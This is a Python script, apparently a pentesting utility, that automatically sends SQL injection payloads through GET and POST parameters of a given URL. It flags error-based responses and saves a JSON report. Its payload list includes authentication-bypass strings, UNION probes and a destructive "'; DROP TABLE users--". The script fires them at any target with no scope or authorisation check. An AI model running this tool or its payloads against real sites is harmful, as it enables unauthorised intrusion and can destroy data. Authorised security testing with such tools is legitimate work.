#!/usr/bin/env python3
"""
SQL Injection Tester - Automated SQL injection detection
Author: Safouan Benali
License: MIT
"""

import requests
import argparse
import time
import json
from urllib.parse import urljoin, urlparse
from typing import List, Dict, Optional

class SQLInjectionTester:
    """Automated SQL injection vulnerability tester."""
    
    def __init__(self, base_url: str, timeout: int = 10):
        self.base_url = base_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
    
    def test_parameter(self, url: str, param: str, value: str) -> Dict:
        """Test a specific parameter for SQL injection."""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 'x'='x",
            "1' OR '1'='1",
            "admin'--",
            "' OR 1=1#",
            "' OR 'a'='a",
            "1' AND '1'='1"
        ]
        
        results = []
        
        for payload in payloads:
            try:
                # Test GET parameter
                test_url = f"{url}?{param}={payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Check for SQL error indicators
                error_indicators = [
                    'mysql_fetch_array',
                    'ORA-01756',
                    'Microsoft OLE DB Provider',
                    'SQLServer JDBC Driver',
                    'PostgreSQL query failed',
                    'Warning: mysql_',
                    'valid MySQL result',
                    'MySqlClient.',
                    'SQL syntax',
                    'mysql_num_rows'
                ]
                
                if any(indicator in response.text for indicator in error_indicators):
                    results.append({
                        'payload': payload,
                        'method': 'GET',
                        'vulnerable': True,
                        'error_found': True,
                        'response_code': response.status_code
                    })
                
                # Test POST parameter
                data = {param: payload}
                response = self.session.post(url, data=data, timeout=self.timeout)
                
                if any(indicator in response.text for indicator in error_indicators):
                    results.append({
                        'payload': payload,
                        'method': 'POST',
                        'vulnerable': True,
                        'error_found': True,
                        'response_code': response.status_code
                    })
                    
            except Exception as e:
                results.append({
                    'payload': payload,
                    'method': 'GET/POST',
                    'vulnerable': False,
                    'error': str(e)
                })
        
        return {
            'parameter': param,
            'url': url,
            'results': results,
            'vulnerable': any(r.get('vulnerable', False) for r in results)
        }
    
    def scan_url(self, url: str, parameters: List[str]) -> List[Dict]:
        """Scan a URL for SQL injection vulnerabilities."""
        print(f"Scanning: {url}")
        vulnerabilities = []
        
        for param in parameters:
            result = self.test_parameter(url, param, "test")
            if result['vulnerable']:
                vulnerabilities.append(result)
                print(f"  ✓ Potential SQL injection in parameter: {param}")
        
        return vulnerabilities
    
    def generate_report(self) -> Dict:
        """Generate vulnerability report."""
        return {
            'target': self.base_url,
            'scan_time': time.time(),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities
        }

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Tester')
    parser.add_argument('-u', '--url', required=True, help='Target URL to test')
    parser.add_argument('-p', '--parameters', nargs='+', help='Parameters to test')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout')
    
    args = parser.parse_args()
    
    tester = SQLInjectionTester(args.url, args.timeout)
    
    # Default parameters if none specified
    parameters = args.parameters or ['id', 'user', 'search', 'q', 'query']
    
    vulnerabilities = tester.scan_url(args.url, parameters)
    tester.vulnerabilities = vulnerabilities
    
    report = tester.generate_report()
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"Results saved to {args.output}")
    else:
        print(f"\nFound {len(vulnerabilities)} potential SQL injection vulnerabilities")

if __name__ == "__main__":
    main()
